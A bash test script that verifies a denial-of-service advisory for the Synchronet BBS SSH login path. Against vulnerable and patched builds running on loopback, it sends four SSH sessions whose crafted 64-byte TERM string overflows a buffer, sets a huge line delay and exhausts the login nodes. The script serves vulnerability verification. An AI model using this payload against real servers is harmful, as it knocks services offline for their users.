#!/usr/bin/env bash
# Bounded loopback-only test of the advisory's availability claim at real
# sbbs_t::answer(): four oversized TERMs whose chosen bytes set line_delay to
# ~1.2e9 ms, then a fifth connection. Vulnerable form should exhaust the four
# terminal nodes; upstream cb6d77dbca fixed form should not.
# No external probes; every client targets 127.0.0.1 started by this script.
set -euo pipefail
cd "$(dirname "$0")/../.."
HERE=$PWD
TREE=$HERE/src-tree
P=$HERE/provision
PARENT=42f586d70792e46b4934176976bc7949b312dede
DEBS="zip libarchive-dev libnspr4-dev autoconf2.13"
E=$HERE/real-answer/availability/evidence
mkdir -p "$E" "$P/debs" "$P/local"

note() { echo "AVAIL $*"; }
pass=0
fail=0
expect() {
    local what=$1 desc=$2
    if eval "$what"; then
        echo "PASS $desc"; pass=$((pass + 1))
    else
        echo "FAIL $desc (test: $what)"; fail=$((fail + 1))
    fi
}

# Same lab-only toolchain provisioning as real-answer/run-real-answer.sh.
test "$(git -C "$TREE" rev-parse HEAD)" = "$PARENT" || { echo TREE_HEAD_MISMATCH; exit 2; }
(cd "$P/debs" && for d in $DEBS; do test -f "${d}_"*.deb || apt-get download "$d"; done)
for d in "$P"/debs/*.deb; do dpkg-deb -x "$d" "$P/local"; done
L=$P/local/usr/lib/x86_64-linux-gnu
ln -sf autoconf2.13 "$P/local/usr/bin/autoconf-2.13"
export PATH="$P/local/usr/bin:$PATH"
export AC_MACRODIR="$P/local/usr/share/autoconf2.13"
export PKG_CONFIG_PATH="$L/pkgconfig${PKG_CONFIG_PATH:+:$PKG_CONFIG_PATH}"
export CPATH="$P/local/usr/include:$P/local/usr/include/nspr${CPATH:+:$CPATH}"
export LIBRARY_PATH="$L${LIBRARY_PATH:+:$LIBRARY_PATH}"
export LD_LIBRARY_PATH="$L${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
FLIBS="-L$L -larchive -lnettle -lacl -llzma -lzstd -llz4 -lbz2 -lz -lxml2"

cleanup_stale() {
    pkill -9 -f 'gcc.linux.x64.exe.debug/sbbs nd nh nj ne' 2>/dev/null || true
    sleep 1
}
PORT=22224
write_ini() {
    cat > "$TREE/ctrl/sbbs.$(hostname).ini" <<EOF
; W6 lab-only loopback SSH config for availability probe (gitignored tree)
[Global]
	Hostname =
	Interface = 127.0.0.1
	OutboundInterface = 127.0.0.1
	TempDirectory =
	LogLevel = Debugging
	TLSErrorLevel = Debugging
[BBS]
	AutoStart = true
	SSHInterface = 127.0.0.1
	SSHErrorLevel = Debugging
	SSHPort = $PORT
	SSHConnectTimeout = 10s
	FirstNode = 1
	LastNode = 4
	Options = XTRN_MINIMIZED | ALLOW_SSH | SSH_ANYAUTH | NO_TELNET | NO_HOST_LOOKUP | NO_EVENTS
[Mail]
	AutoStart = false
[FTP]
	AutoStart = false
[Web]
	AutoStart = false
[Services]
	AutoStart = false
[UNIX]
	Daemonize = False
	PidFile = sbbs-w6.pid
	LogFacility = User
	LogIdent = synchronet-w6
	umask = 077
EOF
}
wait_port_free() {
    for i in $(seq 1 40); do
        ss -ltn 2>/dev/null | grep -q ":$PORT " || return 0
        cleanup_stale
        sleep 0.5
    done
    echo PORT_BUSY; return 1
}
start_server() {
    local log=$1
    wait_port_free || return 1
    (cd "$TREE" && exec env SBBSCTRL="$TREE/ctrl" \
        ./src/sbbs3/gcc.linux.x64.exe.debug/sbbs nd nh nj ne > "$log" 2>&1) &
    SPID=$!
    for i in $(seq 1 60); do
        grep -q 'SSH Server listening' "$log" && return 0
        sleep 0.5
    done
    echo SERVER_START_TIMEOUT; return 1
}
stop_server() {
    [ -n "${SPID:-}" ] && kill -TERM "$SPID" 2>/dev/null || true
    [ -n "${SPID:-}" ] && wait "$SPID" 2>/dev/null || true
    cleanup_stale
    SPID=
}
trap stop_server EXIT

run_case() {
    local term=$1 out=$2 i
    (for i in $(seq 1 3); do echo x; sleep 0.2; done) | \
      TERM="$term" timeout 10 ssh -tt \
        -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
        -o PreferredAuthentications=none -o PubkeyAuthentication=no \
        -o PasswordAuthentication=no -o KbdInteractiveAuthentication=no \
        -o HostKeyAlgorithms=+ssh-rsa -o ConnectTimeout=5 \
        -p "$PORT" lab@127.0.0.1 > "$out" 2>&1 || true
}

build() {
    cleanup_stale
    make -C "$TREE/3rdp/build" jslib > "$P/jslib-w6.log" 2>&1 || return 1
    make -C "$TREE/src/sbbs3" FILE_LIBS="$FLIBS" > "$P/build-w6.log" 2>&1 || return 1
}

CHOSEN="$(printf 'A%.0s' $(seq 1 41))$(printf 'B%.0s' $(seq 1 3))MISHE-OOTAUFTAUF$(printf 'Z%.0s' $(seq 1 4))"
CONTROL="$(printf 'A%.0s' $(seq 1 40))"
test "${#CHOSEN}" -eq 64 || { echo BAD_TERM_LENGTH; exit 3; }

burst() {
    # $1=label, $2=TERM, $3=probe string
    local label=$1 term=$2 probe=$3 i c pids=()
    for i in 1 2 3 4; do
        run_case "$term" "$E/${label}-client-$i.log" &
        pids+=($!)
        sleep 0.4
    done
    c=0
    for i in $(seq 1 60); do
        c=$(grep -c "$probe" "$E/${label}-server.log" 2>/dev/null || true)
        [ "$c" -ge 4 ] && break
        sleep 0.25
    done
    note "$label probes seen: $c"
    for p in "${pids[@]}"; do wait "$p" || true; done
    sleep 2
    # Non-invasive thread-state snapshot: $SPID is the exec'd sbbs process.
    # gdb -p is unavailable here (Yama ptrace_scope), so read /proc directly.
    for t in /proc/$SPID/task/*; do
        printf '%s ' "$(basename "$t")"
        (cat "$t/comm" "$t/wchan" "$t/syscall" 2>/dev/null || true) | tr '\n' ' '
        echo
    done > "$E/${label}-threads.txt"

    run_case "$CONTROL" "$E/${label}-client-5th.log"
}

# 1. Vulnerable pinned statement.
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/real-answer/vulnerable-probe.patch") || exit 4
build || { echo BUILD_FAILED_VULN; exit 5; }
write_ini
start_server "$E/vuln-server.log" || exit 6
burst vuln "$CHOSEN" 'REAL_ANSWER_PROBE'
stop_server

# 2. Upstream fixed form.
git -C "$TREE" checkout -- src/sbbs3/answer.cpp
(cd "$TREE" && patch -p1 < "$HERE/real-answer/fixed-probe.patch") || exit 7
build || { echo BUILD_FAILED_FIXED; exit 8; }
write_ini
start_server "$E/fixed-server.log" || exit 9
burst fixed "$CHOSEN" 'REAL_FIXED_PROBE'
stop_server

# Checks (negatives are preserved as evidence, not retried into existence).
expect "test \$(grep -c 'REAL_ANSWER_PROBE sizeof=41 l=64 off41=42 off44=4853494d' '$E/vuln-server.log') -ge 4" \
    'vulnerable: four chosen line_delay probes'
expect "grep -q '!No nodes available for login.' '$E/vuln-server.log'" \
    'vulnerable: fifth connection refused for node exhaustion'
expect "grep -qiE 'nanosleep|hrtimer' '$E/vuln-threads.txt'" \
    'vulnerable: a server thread parked in nanosleep'
expect "test \$(grep -c 'REAL_FIXED_PROBE sizeof=41 len=64 off40=00 off44=00000000' '$E/fixed-server.log') -ge 4" \
    'fixed: four bounded probes'
expect "! grep -q '!No nodes available for login.' '$E/fixed-server.log'" \
    'fixed: fifth connection not refused'
expect "test \$(grep -c 'Attaching to Node' '$E/fixed-server.log') -ge 5" \
    'fixed: five connections each attached to a node'

echo "RESULT: PASS=$pass FAIL=$fail"
test "$fail" -eq 0
